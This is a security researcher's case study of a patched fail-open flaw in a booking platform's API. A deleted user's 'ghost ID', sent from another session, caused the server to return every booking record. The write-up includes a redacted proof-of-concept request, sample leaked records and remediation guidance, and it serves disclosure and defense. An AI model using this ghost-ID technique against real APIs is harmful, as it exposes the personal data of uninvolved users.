# 📑 Case Study: Full Database Leak via "Fail-Open" Logic Flaw

**Date:** March 2026  
**Severity:** CRITICAL (CVSS 9.1)  
**Vulnerability Type:** Improper Error Handling / Fail-Open Logic  
**Status:** Patched ✅

---

### 🔍 Discovery Overview
During a security assessment of a booking platform's account lifecycle, I identified a critical logic flaw in how the backend handles "Ghost IDs"—User IDs belonging to deleted accounts. This research demonstrates how a simple unhandled exception in an API filter can lead to a global data leak of Personally Identifiable Information (PII).

### 🛠️ The Attack Flow
The vulnerability occurs when a user provides an ID that does not exist in the active user table. Instead of returning a "Not Found" error, the application fails into an "open" state.


1. **Reconnaissance:** Identified the unique `user_id` format during a legitimate session.
2. **Account Deletion:** Purposefully deleted the account to turn the active ID into a "Ghost ID."
3. **Exploitation:** Injected the Ghost ID into a sensitive API endpoint from a different authenticated session.
4. **Result:** The backend filter encountered an exception and defaulted to returning all records in the database.

---

### 💻 Technical Proof of Concept (Redacted)
The vulnerability was triggered via the following request structure. Notice that the `user_id` provided does not match the session token.

**Request:**
```http
POST /api/v1/view-records HTTP/1.1
Host: redacted-app.com
Authorization: Bearer [Valid_Session_Token]
Content-Type: application/json

{
  "user_id": "GHOST_ID_99921", 
  "filter": "all"
}


### The "Fail-Open" Response:
The server responded with a 200 OK containing a JSON array of every booking record in the system.

```[
  { "id": 1, "name": "Admin", "email": "admin@target.com", "booking_ref": "ABC-123" },
  { "id": 2, "name": "Victim_User", "email": "victim@email.com", "booking_ref": "XYZ-789" },
  "// ... 50,000+ more entries"
]'''

---

🛡️ Remediation & Mitigation
To address this, I provided the following actionable guidance:

Strict Object-Level Authorization (BOLA): Implement a check to ensure the user_id in the request body is strictly mapped to the user_id in the authenticated session token.

Secure Fail-States: Modify the backend query logic to return an empty set [] or a 404 Not Found if a User ID lookup fails, ensuring the system "Fails-Safe."

Input Validation: Ensure all API parameters are validated against the current database state before executing the primary data-fetch query.
